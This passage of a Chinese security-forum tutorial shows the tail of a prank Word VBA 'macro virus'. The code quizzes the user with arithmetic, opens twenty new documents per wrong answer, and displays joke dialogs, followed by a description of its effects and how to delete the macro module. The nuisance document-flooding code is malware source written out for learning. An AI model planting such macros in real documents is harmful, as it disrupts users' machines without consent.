
```vb
Beep

Selection.InsertAfter Text:="答案："               '嵌入文本

Selection.Font.Italic = 1                          '设置文本字体为斜体

Selection.InsertAfter Text:="你妹啊，我不是！"     '嵌入文本

Selection.InsertParagraphAfter                     '换行

Selection.InsertParagraphAfter                     '换行

Selection.Font.Italic = 0                          '撤销文本为斜体

Beep

Selection.InsertAfter Text:="如何防御宏病毒"       '嵌入文本

Selection.InsertParagraphAfter                     '换行

Selection.InsertParagraphAfter                     '换行

Beep

Selection.InsertAfter Text:="答案："               '嵌入文本

Selection.Font.Italic = 1                          '设置文本字体为斜体

Selection.InsertAfter Text:="别看我，我不知道……" '嵌入文本

MsgBox "按确定键，我将告诉你一个秘密……", "好吧，告诉你吧！我就是梧州学院Small

boy\_Virus！"

GoTo out                                                 '退出goto语句

'****输入答案不正确后将要执行的语句*****************************************************

Else                          '执行else语句，也就是回答错误后将要执行的

    Count = Count + 1                       'count++，本来count初始化为0

    For j = 1 To 20                         '执行循环语句，循环20次

    Beep

    Documents.Add                           '增加一个现在这个文档

    Next j

Selection.Paragraphs.Alignment = wdAlignParagraphCenter

'设置文本格式为居中对齐

Selection.InsertAfter Text:="宏病毒"        '嵌入一个文本

If Count = 2 Then GoTo out

'判断是否执行打开该文本操作够2个20次，如果够了就退出goto语句

GoTo try

WordBasic.filedefault  '退出WordBasic文本

End If

Wend            '结束with语句

out:            '退出

End Sub         '退出Sub
```

保存文本，按F5进行调试就会得出如图6结果：

点击“确定”将会弹出让你算出一个算术题，然你算出结果，输入答案。如图7

输入答案后点击“确定”，如果结果错误他将会弹出20个当前文本，如图8所示：

然后继续让你解答另一个心算题，如果错了它再继续弹出20个当前文本，如图9：图10

任务管理器瞬间爆表！然后一切归于平静（默默的挨个关闭文档窗口（T\_T））

当然，如果你答对了心算题之后，将会出现另一种现象，首先会弹出下面会话框，如图11：

点击确定，将会弹出新的一个文本和一个对话框，文本上面有文字，如图12：

点击确定，将弹出另一个对话框，如图13：

点击之后就没有下文了。整个宏病毒雏形功能实现完毕。

2. 病毒清除

清除病毒很简单，打开word文档，然后在建立一个公用宏模板。开发工具==》宏（alt+F8）

将相关的模块删除即可，如图14：

![](https://bbs.kanxue.com/upload/attach/201412/636148_9zko2n83rxph4dg.png)

![](https://bbs.kanxue.com/upload/attach/201412/636148_ki1lwvjwo5d89mb.png)

![](https://bbs.kanxue.com/upload/attach/201412/636148_wk8dhqzdqg2xk9q.png)

![](https://bbs.kanxue.com/upload/attach/201412/636148_txnw5a7y7rta38t.png)

![](https://bbs.kanxue.com/upload/attach/201412/636148_1d0u2d0enl1pzs0.png)

![](https://bbs.kanxue.com/upload/attach/201412/636148_mhcaqqdhqq3fr8o.png)

![](https://bbs.kanxue.com/upload/attach/201412/636148_w5pm6bu00l1v46h.png)

![](https://bbs.kanxue.com/upload/attach/201412/636148_9u9rsx2tdhdtlvq.png)

![](https://bbs.kanxue.com/upload/attach/201412/636148_x2zlq5f18tcvy7r.png)

![](https://bbs.kanxue.com/upload/attach/201412/636148_36lkt3qwynqhz90.png)

![](https://bbs.kanxue.com/upload/attach/201412/636148_luojlug2fud1907.png)

![](https://bbs.kanxue.com/upload/attach/201412/636148_45z1rhy676qul6m.png)

![](https://bbs.kanxue.com/upload/attach/201412/636148_cup9qhvoksbbr6f.png)

![](https://bbs.kanxue.com/upload/attach/201412/636148_4a88tt5zl44abew.png)

[传递专业知识、拓宽行业人脉——看雪讲师团队等你加入！！](https://bbs.kanxue.com/thread-275828.htm)

上传的附件：

- [1.png](javascript:void(0);)

  （45.66kb，12次下载）

- [2.png](javascript:void(0);)

  （34.93kb，6次下载）

- [3.png](javascript:void(0);)

  （72.26kb，5次下载）

- [4.png](javascript:void(0);)

  （22.02kb，3次下载）

- [5.png](javascript:void(0);)

  （28.04kb，4次下载）

- [6.png](javascript:void(0);)

  （29.64kb，5次下载）

- [7.png](javascript:void(0);)

  （35.99kb，3次下载）

- [8.png](javascript:void(0);)

  （107.69kb，3次下载）

- [9.png](javascript:void(0);)

  （33.78kb，3次下载）

- [10.png](javascript:void(0);)

  （120.46kb，3次下载）

- [11.png](javascript:void(0);)

  （26.83kb，4次下载）

- [12.png](javascript:void(0);)

  （36.29kb，4次下载）

- [13.png](javascript:void(0);)

  （17.21kb，3次下载）

- [14.png](javascript:void(0);)

  （45.43kb，3次下载）
